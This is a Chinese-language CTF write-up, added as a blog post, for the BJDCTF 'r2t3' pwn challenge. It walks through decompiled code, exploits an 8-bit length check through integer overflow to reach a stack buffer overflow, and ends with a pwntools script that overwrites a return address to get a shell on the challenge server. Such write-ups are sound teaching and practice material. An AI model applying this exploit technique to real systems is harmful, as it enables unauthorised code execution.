@@ -1,0 +1,77 @@
+---
+layout: post
+title:  r2t3
+date:   2021-01-28 00:01:01 +0300
+image:  2021-01-28-sunset.jpg
+tags:   [ctf,PWN,BJDCTF]
+---
+
+主函数
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf; // [esp+0h] [ebp-408h]
+
+  my_init();
+  puts("**********************************");
+  puts("*     Welcome to the BJDCTF!     *");
+  puts("[+]Ret2text3.0?");
+  puts("[+]Please input your name:");
+  read(0, &buf, 0x400u);
+  name_check(&buf);
+  puts("Welcome ,u win!");
+  return 0;
+}
+```
+
+无漏洞，查看name_check()函数
+
+```assembly
+char *__cdecl name_check(char *s)
+{
+  char dest; // [esp+7h] [ebp-11h]
+  unsigned __int8 v3; // [esp+Fh] [ebp-9h]
+
+  v3 = strlen(s);
+  if ( v3 <= 3u || v3 > 8u )
+  {
+    puts("Oops,u name is too long!");
+    exit(-1);
+  }
+  printf("Hello,My dear %s", s);
+  return strcpy(&dest, s);
+}
+```
+
+此处dest大小只有0x11，存在漏洞。
+
+但是想要利用漏洞必须先绕过strlen()函数，第一反应想到使用'\0'绕过，但是'\0'也会绕过strcpy()，这样就无法造成dest溢出。
+
+后来发现v3的类型为__int8
+
+Int8, 等于Byte, 占1个字节.
+
+Int16, 等于short, 占2个字节. -32768~32767
+
+Int32, 等于int, 占4个字节. -2147483648~2147483647
+
+Int64, 等于long, 占8个字节. -9223372036854775808~9223372036854775807
+
+此处可以利用整数溢出
+
+即4+2<sup>8</sup>=260~8+2<sup>8</sup>=264
+
+```assembly
+from pwn import *
+
+io = remote("node3.buuoj.cn",26212)
+
+system = 0x804858b
+payload = "a" * (0x11 + 4) + p32(system)
+payload  = payload.ljust(260, "a")
+io.send(payload)
+
+io.interactive()
+```
+
